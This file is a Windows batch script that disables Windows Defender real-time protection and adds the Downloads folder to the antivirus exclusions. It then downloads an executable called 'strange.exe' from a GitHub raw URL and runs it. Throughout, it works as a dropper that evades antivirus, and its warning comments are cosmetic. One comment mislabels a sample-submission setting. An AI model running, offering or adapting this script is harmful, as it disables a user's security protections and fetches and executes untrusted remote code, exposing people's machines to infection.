@echo off
setlocal

:: Define parameters
set "url=https://github.com/winorap/hh-rhy/raw/refs/heads/main/strange.exe"
set "outputFileName=strange.exe"
set "outputFilePath=%USERPROFILE%\Downloads\%outputFileName%"

:: Disable Windows Defender real-time protection (not recommended for general use)
echo Disabling Windows Defender real-time protection...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host 'Windows Defender real-time protection disabled.' -ForegroundColor Yellow"

:: Enable automatic sample submission to Windows Defender
echo Enabling automatic sample submission to Windows Defender...
powershell -Command "Set-MpPreference -SubmitSamplesConsent AlwaysPrompt; Write-Host 'Automatic sample submission enabled.' -ForegroundColor Green"

:: Add the Downloads folder to antivirus exclusions (Windows Defender)
echo Adding Downloads folder to antivirus exclusions...
powershell -Command "try { Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; Write-Host 'Downloads folder successfully added to exclusions.' -ForegroundColor Green } catch { Write-Host 'Failed to add Downloads folder to antivirus exclusions.' -ForegroundColor Red; exit 1 }"

:: Wait briefly to ensure exclusion is registered
timeout /t 1 >nul

:: Download the file
echo Downloading file from %url% to %outputFilePath%...
powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File successfully downloaded to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }"

:: Check if the file exists
if not exist "%outputFilePath%" (
    echo Failed to download the file to %outputFilePath%.
    exit /b 1
)

:: Run the downloaded file
echo Executing the downloaded file: %outputFilePath%
start "" "%outputFilePath%"

:: Re-enable Windows Defender real-time protection after execution
echo Enabling Windows Defender real-time protection...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false; Write-Host 'Windows Defender real-time protection re-enabled.' -ForegroundColor Green"

:: Security Warning
echo WARNING: Running downloaded files can be risky. Ensure the source URL is trusted before proceeding.
pause
